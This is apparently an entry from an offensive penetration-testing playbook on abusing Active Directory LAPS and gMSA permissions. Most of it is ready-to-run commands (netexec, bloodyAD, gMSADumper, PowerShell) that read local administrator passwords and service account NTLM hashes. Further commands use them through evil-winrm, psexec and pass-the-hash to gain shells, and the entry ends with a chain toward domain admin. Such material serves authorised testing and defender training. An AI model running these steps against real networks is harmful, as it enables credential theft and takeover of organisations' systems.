---
id: laps-abuse
title: LAPS & gMSA Abuse
stage: privesc
tags: [windows, ad]
summary: Read LAPS local admin passwords or gMSA service account NTLM hashes from AD if your account has ReadProperty access — BloodHound shows both as explicit edges.
leads_to:
  - system-shell
  - domain-admin
---

## Prerequisites

A domain account with `ReadLAPSPassword` or `ReadGMSAPassword` rights — visible in BloodHound as explicit edges. nxc (netexec) installed for LAPS module, or bloodyAD/gMSADumper for gMSA.

LAPS randomises the local Administrator password on each domain-joined machine and stores it in `ms-Mcs-AdmPwd` in AD. Only accounts with `AllExtendedRights` or specific `ReadProperty` on that attribute can retrieve it. gMSA passwords live in `msDS-ManagedPassword`. Both can be read over LDAP with valid credentials if the ACL allows it — no shell on the target machine required.

## Quick Win

> nxc laps module lists every machine where your account can read the LAPS password.

```bash
nxc ldap $DC -u user -p password -M laps
```

## Check LAPS Presence and Read Password

> Verify LAPS is deployed, then retrieve the password for target machines.

```bash
# Check which machines you can read LAPS for (lists all at once)
nxc ldap $DC -u user -p password -M laps

# Read password for a specific machine via bloodyAD
bloodyAD -u user -p 'password' -d $DOMAIN --host $DC_IP get search \
  --filter '(ms-mcs-admpwdexpirationtime=*)' --attr ms-mcs-admpwd
```

```powershell
# From Windows — PowerView / LAPS module
Find-AdmPwdExtendedRights -ComputerName $TARGET_COMPUTER
Get-AdmPwdPassword -ComputerName $TARGET_COMPUTER

# Manual AD query
Get-ADComputer -Filter * -Properties ms-Mcs-AdmPwd |
  Where-Object { $_.'ms-Mcs-AdmPwd' } |
  Select Name, 'ms-Mcs-AdmPwd'
```

## gMSA Password Retrieval

> gMSA passwords are stored in AD and readable by accounts in PrincipalsAllowedToRetrieveManagedPassword.

```bash
# gMSADumper (outputs account:::NTLM_HASH)
python3 gMSADumper.py -u user -p password -d domain.local -l $DC

# bloodyAD
bloodyAD --host $DC_IP -d domain.local -u user -p 'password' \
  get object gMSA_ACCOUNT$ --attr msDS-ManagedPassword
```

```powershell
# From Windows
$gmsa = Get-ADServiceAccount -Identity gMSA_ACCOUNT -Properties msDS-ManagedPassword
$mp = $gmsa.'msDS-ManagedPassword'
$blob = $mp | ConvertFrom-ADManagedPasswordBlob
$blob.CurrentPassword
```

## Use Retrieved Credentials

> LAPS password → local admin session. gMSA hash → PTH with the machine account name.

```bash
# LAPS — authenticate as local Administrator
nxc smb $TARGET -u Administrator -p 'LAPS_PASSWORD' --local-auth
evil-winrm -i $TARGET -u Administrator -p 'LAPS_PASSWORD'

# gMSA — pass-the-hash (note the trailing $ in the account name)
impacket-psexec domain.local/'gMSA_ACCOUNT$'@$TARGET -hashes :NTLM_HASH
evil-winrm -i $TARGET -u 'gMSA_ACCOUNT$' -H NTLM_HASH
```

## Leads To

LAPS password retrieved → local admin on that machine → dump SAM/LSA → pass-the-hash laterally → system-shell. gMSA hash retrieved → PTH as service account → if service account has DA rights → domain-admin. If you have `WriteDACL` on `PrincipalsAllowedToRetrieveManagedPassword` → add yourself to that group → read all gMSA passwords.
